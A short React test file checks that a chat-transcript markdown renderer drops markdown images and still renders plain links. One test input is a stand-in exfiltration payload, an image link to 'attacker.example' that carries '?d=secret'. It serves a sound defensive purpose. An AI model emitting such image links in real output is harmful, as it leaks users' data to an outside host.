import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { ShowcaseMarkdown } from '../ChatTranscript';

describe('ShowcaseMarkdown', () => {
  it('does not render a markdown image, so no request leaves the page', () => {
    const { container } = render(
      <ShowcaseMarkdown source="Hello ![x](https://attacker.example/p.png?d=secret) there" />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container).toHaveTextContent('Hello');
  });

  it('still renders ordinary links', () => {
    const { container } = render(<ShowcaseMarkdown source="[Meridian](https://example.com/a)" />);

    expect(container.querySelector('a')).toHaveAttribute('href', 'https://example.com/a');
  });
});
